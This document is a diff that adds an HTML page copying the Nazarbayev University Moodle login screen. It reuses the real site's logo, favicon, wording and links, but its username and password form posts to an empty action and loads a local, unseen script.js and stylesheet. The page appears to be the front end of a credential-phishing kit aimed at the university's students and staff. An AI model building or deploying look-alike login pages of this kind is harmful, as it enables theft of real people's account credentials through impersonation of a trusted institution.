@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+   <meta charset="UTF-8">
+   <meta http-equiv="X-UA-Compatible" content="IE=edge">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <title>moodle.nu.edu.kz: Log in to the site</title>
+   <script src="https://kit.fontawesome.com/3867bb8a54.js" crossorigin="anonymous"></script>
+   <link rel="shortcut icon" href="https://moodle.nu.edu.kz/theme/image.php/boost/theme/1668343193/favicon">
+   <link rel="stylesheet" href="ssstyle.css">
+</head>
+<body>
+   <div id="page-wrapper">
+      <div id="page" class="container-fluid mt-0">
+         <div id="page-content" class="row">
+            <div id="region-main-box" class="col-12">
+               <section id="region-main" class="col-12" aria-label="Content">
+                  <span class="notifications" id="user-notifications"></span>
+                  <div role="main">
+                     <span id="maincontent"></span>
+                     <div class="my-1 my-sm-5"></div>
+                     <div class="row justify-content-center">
+                        <div class="col-xl-6 col-sm-8 ">
+                           <div class="card">   
+                              <div class="card-block">
+                                 <h1 class="h2 card-header text-center">
+                                    <span class="sr-only">moodle.nu.edu.kz: Log in<div></div></span>
+                                    <img class="img-fluid" src="https://moodle.nu.edu.kz/pluginfile.php/1/core_admin/logo/0x200/1668343193/logo.png" alt="">
+                                 </h1>
+                                 <div class="card-body">
+                                    <div id="hidden-alert"></div>
+                                    <div class="row justify-content-md-center">
+                                       <div class="col-md-5">
+                                          <form id="comp-form" class="mt-3" action="" method="post" id="login">
+                                          <input id="anchor" type="hidden" name="anchor" value="">
+                                          <script>document.getElementById('anchor').value = location.hash;</script>
+                                          <input type="hidden" name="logintoken" value="">
+                                          <!-- BGqsSIXSOgNnnOJ1f8krZgxTI7lxxX4u -->
+                                          <div class="form-group">
+                                             <label for="username" class="sr-only">
+                                                      Username
+                                             </label>
+                                             <input type="text" name="username" id="username" class="form-control" value="" placeholder="Username" autocomplete="username">
+                                          </div>
+                                          <div class="form-group">
+                                             <label for="password" class="sr-only">Password</label>
+                                             <input type="password" name="password" id="password" value="" class="form-control" placeholder="Password" autocomplete="current-password">
+                                          </div>
+                                          <div class="rememberpass mt-3">
+                                             <input type="checkbox" name="rememberusername" id="rememberusername" value="1" checked="checked">
+                                             <label for="rememberusername">Remember username</label>
+                                          </div>
+
+                                          <button type="submit" class="btn btn-primary btn-block mt-3" id="loginbtn">Log in</button>
+                                          </form>
+                                       </div>
+
+                                       <div class="col-md-5">
+                                          <div class="forgetpass mt-3">
+                                             <p><a href="https://moodle.nu.edu.kz/login/forgot_password.php">Forgotten your username or password?</a></p>
+                                          </div>
+
+                                          <div class="mt-3">
+                                             Cookies must be enabled in your browser
+                                             <a class="btn btn-link p-0" role="button" data-container="body" data-toggle="popover" data-placement="right" data-content="<div class=&quot;no-overflow&quot;><p>Two cookies are used on this site:</p>
+
+                                             <p>The essential one is the session cookie, usually called MoodleSession. You must allow this cookie in your browser to provide continuity and to remain logged in when browsing the site. When you log out or close the browser, this cookie is destroyed (in your browser and on the server).</p>
+
+                                             <p>The other cookie is purely for convenience, usually called MOODLEID or similar. It just remembers your username in the browser. This means that when you return to this site, the username field on the login page is already filled in for you. It is safe to refuse this cookie - you will just have to retype your username each time you log in.</p>
+                                             </div> " data-html="true" tabindex="0" data-trigger="focus">
+                                             <i class="icon fa fa-question-circle text-info fa-fw " title="Help with Cookies must be enabled in your browser" aria-label="Help with Cookies must be enabled in your browser"></i>
+                                             </a>
+                                          </div>
+                                       </div>
+                                    </div>
+                                 </div>
+                              </div>
+                           </div>
+                        </div>
+                     </div>
+                     <div class="row justify-content-center mt-3">
+                        <div class="col-xl-6 col-sm-8">
+                           <div class="card">
+                              <div class="card-body">
+                                 <div class="card-title">
+                                       <h2>Is this your first time here?</h2>
+                                 </div>
+                                 <div>
+                                 <p dir="ltr" style="text-align:left;"></p><ul><li>Possible system slow down between 3:30 am till 5:00 am due to system backup&nbsp;</li><li>If you have previously had access to Moodle please use the same username and password that you use at&nbsp;<a href="http://registrar.nu.edu.kz/">registrar.nu.edu.kz</a>&nbsp;and&nbsp;<a href="http://my.nu.edu.kz/" target="_blank" rel="noreferrer noopener">NU portal</a>. If you still experience problems with&nbsp;log in&nbsp;try resetting your password at&nbsp;<a href="https://prs.nu.edu.kz/">https://prs.nu.edu.kz</a>.</li><li>For new users who need to access Moodle at NU please contact&nbsp;by e-mail at&nbsp;<a href="mailto:helpdesk@nu.edu.kz" target="_blank" rel="noreferrer noopener">helpdesk@nu.edu.kz</a></li></ul><br><p></p>
+                                 </div>
+                              </div>
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+               </section>
+            </div>
+         </div>
+      </div>
+      <footer id="page-footer" class="py-3 bg-dark text-light">
+         <div class="container">
+            <div id="course-footer"></div>
+
+
+            <div class="logininfo">You are not logged in.</div>
+            <div class="homelink"><a href="https://moodle.nu.edu.kz/">Home</a></div>
+            <div class="tool_dataprivacy"><a href="https://moodle.nu.edu.kz/admin/tool/dataprivacy/summary.php">Data retention summary</a></div><a href="https://download.moodle.org/mobile?version=2021051700.07&amp;lang=en&amp;iosappid=633359593&amp;androidappid=com.moodle.moodlemobile">Get the mobile app</a>
+         </div>
+      </footer>
+   </div>
+   <script src="script.js"></script>
+</body>
+</html>
